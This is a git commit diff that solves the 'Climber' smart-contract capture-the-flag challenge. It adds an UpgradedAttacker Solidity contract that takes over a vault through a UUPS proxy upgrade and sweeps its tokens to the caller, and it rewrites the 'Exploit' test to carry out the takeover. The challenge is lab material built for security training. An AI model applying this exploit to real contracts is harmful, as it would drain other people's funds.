4f46e17b3d074b7de51f168c60838fa4a955dfba
balag3 <b.kocsis@ildsoftware.ch>
2022-01-04 09:51:08 +0100

    Solves Climber

--- contracts/climber/UpgradedAttacker.sol
+++ contracts/climber/UpgradedAttacker.sol
@@ -1,14 +1,32 @@
-import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
+import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
 import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
-contract UpgradedAttacker is UUPSUpgradeable {
+contract UpgradedAttacker is Initializable, OwnableUpgradeable, UUPSUpgradeable {
 
-    function sweepAllFunds(address tokenAddress, address attacker) external {
-        IERC20 token = IERC20(tokenAddress);
-        require(token.transfer(attacker, token.balanceOf(address(this))), "Transfer failed");
+    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
+    uint256 public constant WAITING_PERIOD = 15 days;
+
+    uint256 private _lastWithdrawalTimestamp;
+    address private _sweeper;
+
+    /// @custom:oz-upgrades-unsafe-allow constructor
+    constructor() initializer {}
+
+    function initialize() initializer external {
+        __Ownable_init();
+        __UUPSUpgradeable_init();
     }
 
-    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
-    function _authorizeUpgrade(address newImplementation) internal override {
+    function sweepFunds(address tokenAddress) external {
+        IERC20 token = IERC20(tokenAddress);
+        require(token.transfer(msg.sender, token.balanceOf(address(this))), "Transfer failed");
+    }
+
+    function _authorizeUpgrade(address newImplementation) internal onlyOwner override {
     }
 }
--- test/climber/climber.challenge.js
+++ test/climber/climber.challenge.js
@@ -53,14 +53,20 @@ describe('[Challenge] Climber', function () {
     });
 
     it('Exploit', async function () {
-        this.upgrade  = await (await ethers.getContractFactory('UpgradedAttacker', attacker)).deploy();
-        this.attackerContract  = await (await ethers.getContractFactory('ClimberAttacker', attacker)).deploy(
+        // https://forum.openzeppelin.com/t/execute-upgrade-using-different-signer/14264
+        this.upgradedAttackerContract = await ethers.getContractFactory('UpgradedAttacker', attacker);
+
+        this.attackerContract = await (await ethers.getContractFactory('ClimberAttacker', attacker)).deploy(
             this.timelock.address,
             this.vault.address,
-            this.upgrade.address
+            attacker.address
         );
-        const tx = await this.attackerContract.connect(attacker).attack({value: ethers.utils.parseEther('0.01')});
-        await upgrades.upgradeProxy(this.vault.address, this.upgrade.address);
+        await this.attackerContract.connect(attacker).attack();
+        const compromisedVault = await upgrades.upgradeProxy(
+            this.vault.address,
+            this.upgradedAttackerContract
+        );
+        await compromisedVault.connect(attacker).sweepFunds(this.token.address);
     });
 
     after(async function () {
